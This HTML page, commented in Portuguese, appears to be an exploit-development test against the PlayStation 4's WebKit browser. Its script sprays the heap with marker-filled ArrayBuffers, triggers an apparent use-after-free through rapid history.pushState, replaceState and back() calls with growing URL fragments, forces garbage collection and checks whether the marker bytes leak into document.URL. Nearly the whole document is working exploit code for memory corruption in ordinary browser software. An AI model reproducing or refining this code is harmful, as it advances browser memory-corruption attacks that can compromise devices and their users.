<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit - Teste EEEE (64 bytes)</title>
<style>
    body { background-color: #000; color: #ffff00; font-family: monospace; padding: 20px; }
    button { 
        padding: 20px; width: 100%; margin-bottom: 10px;
        font-weight: bold; font-size: 16px; cursor: pointer; 
        border: 2px solid #ff0; background: #330; color: #fff;
    }
    #log { border: 1px solid #555; margin-top: 20px; padding: 10px; white-space: pre-wrap; height: 350px; overflow-y: scroll;}
    .success { background-color: #ff0; color: #000; font-weight: bold; border: 5px solid #fff; padding: 10px; }
</style>
</head>
<body>
<h2>PS4 WebKit - Validação EEEE (64 bytes)</h2>
<div id="status">Alvo: Bucket 64 -> 'EEEE'</div>
<button onclick="runEETest()">TENTAR EEEE (INSISTA!)</button>
<div id="log"></div>

<script>
const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");

function log(m) { 
    const d = document.createElement("div");
    d.textContent = `[${new Date().toLocaleTimeString().split(' ')[0]}] ${m}`;
    logEl.appendChild(d);
    logEl.scrollTop = logEl.scrollHeight;
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

var keepAlive = [];

// Helper para criar os objetos
function createFakeObject(size, marker) {
    try {
        let buf = new ArrayBuffer(size);
        let view = new Uint32Array(buf);
        for(let i=0; i<view.length; i++) {
            view[i] = marker;
        }
        return buf;
    } catch(e) { return null; }
}

async function runEETest() {
    logEl.innerHTML = "";
    keepAlive = [];
    statusEl.innerText = "Rodando...";

    // CONFIGURAÇÃO ORIGINAL DO SUCESSO
    // Mantemos os outros tamanhos para preservar o 'Chaos' do Heap que funcionou antes
    const BUCKETS = [
        { size: 80,  marker: 0x41414141 }, // AAAA
        { size: 96,  marker: 0x42424242 }, // BBBB
        { size: 64,  marker: 0x45454545 }, // EEEE (Mudança Aqui)
        { size: 128, marker: 0x44444444 }  // DDDD
    ];

    log("1. Preparando Heap (Shotgun)...");
    for(let b of BUCKETS) {
        for(let k=0; k<100; k++) keepAlive.push(createFakeObject(b.size, b.marker));
    }
    
    // Buracos
    keepAlive = keepAlive.filter((_, i) => i % 4 !== 0);

    // 2. TRIGGER UAF (Loop 48)
    log("2. Disparando UAF...");
    
    let size = 977;
    const STEP = 14461;

    for(let i = 0; i < 48; i++) {
        let frag = "V".repeat(size); 
        history.pushState({}, "", "#" + frag);
        history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
        
        if(i % 6 === 0) setTimeout(() => history.back(), 0);
        
        // JANELA CRÍTICA
        if (i === 47) {
            log(">>> SPRAY EEEE <<<");
            setTimeout(() => history.back(), 0);
            
            // Spray Massivo
            for(let k=0; k<300; k++) {
                for(let b of BUCKETS) {
                    keepAlive.push(createFakeObject(b.size, b.marker));
                }
            }
            
            // GC Force
            setTimeout(() => {
                for (let j = 0; j < 4; j++) new ArrayBuffer(8 * 1024 * 1024);
            }, 20); 
        } else {
            size += STEP;
            await sleep(5);
        }
    }
    
    await sleep(500);
    checkResult();
}

function checkResult() {
    statusEl.innerText = "Verificando...";
    let url = document.URL;
    let found = false;
    
    // VERIFICAÇÃO ATUALIZADA PARA 'EEEE'
    // 0x45 = 'E'
    for(let i=0; i < url.length && i < 5000; i++) {
        let c = url.charCodeAt(i);
        
        if(c === 0x45) { // E
            found = true;
            statusEl.innerText = "SUCESSO: EEEE";
            statusEl.className = "success";
            log("!!! SUCESSO !!!");
            log("Encontrado 'EEEE' na memória!");
            log("Offset: " + i);
            break;
        }
        
        // Monitora os outros só por curiosidade
        if(c === 0x41) log("Aviso: Encontrado AAAA (80 bytes) - Inesperado.");
        if(c === 0x43) log("Aviso: Encontrado CCCC (Cache antigo?)");
    }

    if(!found) {
        log("Falha: Ainda vendo 'V'.");
        log("Diagnóstico: A Race Condition falhou desta vez.");
        log("AÇÃO: Recarregue a página e tente novamente. O código está certo, o timing variou.");
    }
}
</script>
</body>
</html>
